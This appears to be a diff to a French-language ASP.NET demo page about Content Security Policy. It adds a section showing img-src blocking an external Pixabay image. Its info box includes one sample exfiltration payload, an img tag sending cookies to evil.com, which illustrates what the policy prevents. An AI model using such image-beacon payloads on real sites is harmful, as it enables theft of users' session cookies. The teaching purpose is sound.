@@ -71,9 +71,76 @@ app.MapGet("/", (HttpContext context) =>
             <div id="xss-target">Zone cible pour l'injection XSS...</div>
         </section>
 
-        <!-- Section 3: Script inline NON autorise (pas de nonce) -->
+        <!-- Section 3: Test image externe (CDN Pixabay) -->
         <section>
-            <h2>3. Script inline sans nonce (BLOQUE)</h2>
+            <h2>3. Image externe et directive <code>img-src</code></h2>
+            <p>
+                La directive <code>img-src</code> controle les sources autorisees pour les images.
+                Actuellement, la politique est : <code>img-src 'self' data:{{(context.Request.Query.ContainsKey("allow-cdn") ? " https://cdn.pixabay.com" : "")}}</code>
+            </p>
+
+            <div class="img-demo-grid">
+                <div class="img-demo-card">
+                    <h3>Image locale (<code>'self'</code>)</h3>
+                    <img src="/demo-image.svg" alt="Image locale" style="max-width:200px; border-radius:8px;">
+                    <p class="img-status success">Toujours autorisee par <code>img-src 'self'</code></p>
+                </div>
+
+                <div class="img-demo-card">
+                    <h3>Image CDN Pixabay</h3>
+                    <img id="pixabay-img"
+                         src="https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885_640.jpg"
+                         alt="Image Pixabay - arbre au coucher du soleil"
+                         style="max-width:200px; border-radius:8px;"
+                         onerror="this.style.display='none'; document.getElementById('img-blocked').style.display='block';"
+                    >
+                    <div id="img-blocked" style="display:none; background:rgba(255,71,87,0.15); border:2px dashed #ff4757; border-radius:8px; padding:2rem; text-align:center; max-width:200px;">
+                        <span style="font-size:2rem;">&#128683;</span><br>
+                        <strong style="color:#ff4757;">BLOQUEE par CSP !</strong><br>
+                        <small>img-src n'autorise pas cdn.pixabay.com</small>
+                    </div>
+                    <p id="img-allowed-msg" class="img-status" style="display:none;">Autorisee car <code>https://cdn.pixabay.com</code> est dans <code>img-src</code></p>
+                </div>
+            </div>
+
+            <div class="mode-links" style="margin-top:1rem;">
+                <a href="/?allow-cdn" class="btn-allow">Autoriser le CDN Pixabay</a> |
+                <a href="/">Bloquer le CDN (par defaut)</a>
+            </div>
+
+            <script nonce="{{nonce}}">
+                var pixImg = document.getElementById("pixabay-img");
+                if (pixImg) {
+                    pixImg.addEventListener("load", function() {
+                        document.getElementById("img-allowed-msg").style.display = "block";
+                        document.getElementById("img-allowed-msg").className = "img-status success";
+                    });
+                    pixImg.addEventListener("error", function() {
+                        var consoleEl = document.getElementById("console-output");
+                        if (consoleEl) {
+                            var line = document.createElement("div");
+                            line.className = "console-line error";
+                            line.textContent = "[CSP] Image Pixabay BLOQUEE par img-src - le domaine cdn.pixabay.com n'est pas autorise";
+                            consoleEl.appendChild(line);
+                        }
+                    });
+                }
+            </script>
+
+            <div class="info-box">
+                <strong>Ce que cela demontre :</strong> CSP ne protege pas seulement contre les scripts malveillants.
+                La directive <code>img-src</code> controle aussi les images, ce qui empeche :
+                <ul style="margin:0.5rem 0 0 1rem;">
+                    <li>Le tracking par pixel espion (<em>tracking pixel</em>)</li>
+                    <li>L'exfiltration de donnees via des URL d'images (<code>&lt;img src="https://evil.com/steal?cookie=..."&gt;</code>)</li>
+                    <li>Le chargement de contenu non desire depuis des sources non fiables</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Section 4: Script inline NON autorise (pas de nonce) -->
+        <section>
+            <h2>4. Script inline sans nonce (BLOQUE)</h2>
             <p>
                 Le script ci-dessous n'a pas de nonce. CSP devrait le bloquer.
                 Ouvrez la console du navigateur pour voir l'erreur.
@@ -88,9 +155,9 @@ app.MapGet("/", (HttpContext context) =>
             </div>
         </section>
 
-        <!-- Section 4: Script inline AUTORISE (avec nonce) -->
+        <!-- Section 5: Script inline AUTORISE (avec nonce) -->
         <section>
-            <h2>4. Script inline avec nonce (AUTORISE)</h2>
+            <h2>5. Script inline avec nonce (AUTORISE)</h2>
             <p>
                 Ce script a le bon nonce et sera execute normalement.
             </p>
@@ -104,17 +171,17 @@ app.MapGet("/", (HttpContext context) =>
             </script>
         </section>
 
-        <!-- Section 5: Console -->
+        <!-- Section 6: Console -->
         <section>
-            <h2>5. Console de log</h2>
+            <h2>6. Console de log</h2>
             <div id="console-output" class="console">
                 <div class="console-line info">[CSP Demo] Initialisation...</div>
             </div>
         </section>
 
-        <!-- Section 6: Rapports de violation -->
+        <!-- Section 7: Rapports de violation -->
         <section>
-            <h2>6. Rapports de violation CSP</h2>
+            <h2>7. Rapports de violation CSP</h2>
             <p>
                 Les violations CSP sont envoyees au endpoint <code>/csp-report</code>.
                 <a href="/csp-violations" style="color:var(--accent);">Voir les rapports collectes (JSON)</a>
